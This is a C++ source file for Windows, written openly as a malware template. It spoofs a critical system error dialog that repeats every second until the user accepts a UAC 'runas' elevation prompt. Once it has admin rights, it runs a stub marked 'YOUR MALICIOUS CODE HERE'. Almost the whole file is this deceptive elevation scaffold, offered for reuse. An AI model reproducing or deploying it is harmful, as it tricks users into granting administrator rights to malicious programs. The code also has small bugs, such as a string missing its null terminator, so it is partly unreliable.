#include <Windows.h>
#include <stdio.h>
#include <string>
using namespace std;

void MaliciousCode()
{
   // YOUR MALICIOUS CODE HERE ^^  
}

char* fileNameOfExe(char* path)
{
    int len=0,i=0;
    char* filename;
    
    while(path[len])
    {
        len++;
    }
    
    for(i=len-1;i>0;i--)
    {
        if(path[i]=='\\')
            break;
    }

    filename = (char*)malloc(sizeof(char) * (len-i));
    int count=0;
    for(int j=i+1;j<len;j++)
    {

        *(filename+count) = path[j];
        count++;
        
    }
    printf("\n");
    return filename;
}

BOOL UAC_prompt(char* path)
{

	LPCTSTR lpFileptr = fileNameOfExe(path);

	std::string lpVerb = "runas";
	LPCTSTR lpVerbptr = lpVerb.c_str();

	
	SHELLEXECUTEINFO sei = { sizeof(sei) };
    sei.lpVerb = lpVerbptr;
    sei.lpFile = lpFileptr;
    sei.hwnd = NULL;
    sei.nShow = SW_NORMAL;

    if (!ShellExecuteEx(&sei))
    {
        DWORD dwError = GetLastError();
        if (dwError == ERROR_CANCELLED)
        {
        	return FALSE;
        }
    }
    else
    {
        return TRUE;  
    }
   
}

void DialogDisplay(char* path)
{
	while(true)
	{
		int msgboxID = MessageBoxW(
	        NULL,
	        (LPCWSTR)L"Crtical Error #2348FA3000032:30 \nNeed to Fix some Drives",
	        (LPCWSTR)L"Dwwin.exe - Dll Initialization Failed",
	        MB_ICONHAND | MB_OKCANCEL   
	    );

	    
		if(msgboxID==IDOK)
		{
			bool permit = UAC_prompt(path);
			if(permit)
				_exit(1);

		}

		Sleep(1000);
    }
}


BOOL IsCodeRunningAsAdminMode()
{
    BOOL fIsRunAsAdmin = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    PSID pAdministratorsGroup = NULL;

    // Allocate and initialize a SID of the administrators group.
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    if (!AllocateAndInitializeSid(
        &NtAuthority, 
        2, 
        SECURITY_BUILTIN_DOMAIN_RID, 
        DOMAIN_ALIAS_RID_ADMINS, 
        0, 0, 0, 0, 0, 0, 
        &pAdministratorsGroup))
    {
        dwError = GetLastError();
        goto Cleanup;
    }

    // Determine whether the SID of administrators group is enabled in 
    // the primary access token of the process.
    if (!CheckTokenMembership(NULL, pAdministratorsGroup, &fIsRunAsAdmin))
    {
        dwError = GetLastError();
        goto Cleanup;
    }


Cleanup:
    // Centralized cleanup for all allocated resources.
    if (pAdministratorsGroup)
    {
        FreeSid(pAdministratorsGroup);
        pAdministratorsGroup = NULL;
    }

    // Throw the error if something failed in the function.
    if (ERROR_SUCCESS != dwError)
    {
        throw dwError;
    }

    return fIsRunAsAdmin;

}

int main(int argc,char** argv)
{
	int flag = IsCodeRunningAsAdminMode();

	if(flag)
        MaliciousCode();
    else
        DialogDisplay(argv[0]);

	return 0;
}